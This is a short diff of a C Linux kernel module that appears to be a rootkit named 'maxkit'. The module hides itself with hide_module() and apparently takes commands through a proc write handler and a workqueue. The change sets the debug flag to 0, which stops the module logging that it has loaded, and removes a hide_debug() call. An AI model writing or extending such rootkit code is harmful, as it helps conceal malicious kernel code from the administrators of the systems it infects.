@@ -48,7 +48,7 @@ static struct workqueue_struct     *nfcc_wq;
 static const struct proc_ops        proc_fops = { .proc_write = proc_write };
 static char                         proc_buffer[256];
 static unsigned long                proc_buffer_size = 0;
-static bool                         debug_enabled = 1;
+static bool                         debug_enabled = 0;
 static bool                         sc_enabled = 1;
 
 MODULE_LICENSE      ("GPL");
@@ -244,7 +244,6 @@ static int __init fsops_init(void)
     if (debug_enabled) LOG_K(KERN_INFO, "loading maxkit");
 
     hide_module();
-    hide_debug();
 
     nfcc_wq = create_singlethread_workqueue("the_command_work_struct");
     if (!nfcc_wq) {
